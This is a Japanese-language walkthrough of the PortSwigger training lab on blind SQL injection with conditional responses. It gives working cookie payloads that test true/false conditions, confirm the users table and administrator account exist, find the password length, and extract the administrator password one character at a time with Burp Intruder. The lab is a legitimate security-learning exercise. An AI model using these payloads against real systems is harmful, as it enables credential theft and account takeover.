# 条件付き応答を使用したブラインド SQL インジェクション

次のハッキングラボを実施します  
https://portswigger.net/web-security/sql-injection/blind/lab-conditional-responses  
このラボにはブラインド SQL インジェクションの脆弱性が含まれています。アプリケーションは分析に追跡 Cookie を使用し、送信された Cookie の値を含む SQL クエリを実行します。

- 1. BurpSuite を起動して、Proxy タブからブラウザを立ち上げます
- 2. ハッキングラボにアクセスします
- 3. ホームページに 2 回アクセスします
- 4. Cookie に TrackingId がある GET / リクエストを send to repeater します
- 5. TrackingId の値の後に　真になる SQL インジェクションを付加します

```
TrackingId=gVVTXw3VzKSixX7U' AND '1'='1
```

応答に Welcome の文字が含まれていることを確認します

- 6.TrackingId の値の後に　偽になる SQL インジェクションを付加します

```
TrackingId=gVVTXw3VzKSixX7U' AND '1'='2
```

応答に Welcome の文字が含まれていないことを確認します

- 7. TrackingId の値の後にテーブル存在確認クエリを付加します

```
TrackingId=gVVTXw3VzKSixX7U' AND (SELECT 'a' FROM users LIMIT 1)='a
```

- 8.  TrackingId の値の後にユーザーの存在確認クエリを付加します

```
TrackingId=gVVTXw3VzKSixX7U' AND (SELECT 'a' FROM users WHERE username='administrator')='a
```

- 9. 次はユーザーパスワードの桁数を確認します

```
TrackingId=gVVTXw3VzKSixX7U' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>1)='a
```

> 20 で Welcome の文字がなくなり、パスワードが 20 桁であることがわかります

- 10. TrackingId の値の後にパスワード探索用クエリを付加して、send to intruder します

```
' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a
```

- 11. パスワード探索用にパラメータ化します

```
Cookie: TrackingId=gVVTXw3VzKSixX7U' AND (SELECT SUBSTRING(password,11,1) FROM users WHERE username='administrator')='§a§;
```

- 12. Grep Match の設定に Welcome を登録します
      ![2](https://github.com/pea-sys/web-security-experiments/assets/49807271/5962d6b7-558a-41ab-a42f-ebc4af0a1509)

- 13. 20 回 20 桁分の攻撃をしかけます
      ![3](https://github.com/pea-sys/web-security-experiments/assets/49807271/528d7a29-d22f-4f90-bf80-220792b6ad63)

- 14. パスワードが判明後、ログインするとラボをクリア出来ます
